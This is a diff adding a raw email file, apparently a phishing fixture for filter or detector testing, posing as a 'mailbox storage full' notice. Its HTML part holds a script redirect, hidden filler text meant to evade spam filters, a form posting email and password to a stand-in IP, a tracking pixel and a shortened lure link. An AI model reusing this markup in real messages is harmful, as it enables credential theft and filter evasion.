@@ -1,0 +1,29 @@
+From: alerts@notice-center.example.net
+To: user@recipient.test
+Subject: Mailbox storage full
+Date: Wed, 23 Sep 2026 09:30:00 +0000
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+ boundary="===============6717898333843632719=="
+
+--===============6717898333843632719==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Your mailbox is full.
+
+--===============6717898333843632719==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body><script>document.location=3D'http://198.51.100.7/x'</script>
+<div style=3D"display:none">lorem ipsum filler text to confuse filters lorem =
+ipsum filler</div>
+<form action=3D"http://198.51.100.7/collect" method=3D"post"><input type=3D"e=
+mail"><input type=3D"password"></form>
+<img src=3D"http://tracker.example.net/p.gif" width=3D"1" height=3D"1">
+<a href=3D"http://bit.ly/3xyz" onclick=3D"x()">Upgrade storage</a></body></ht=
+ml>
+
+--===============6717898333843632719==--
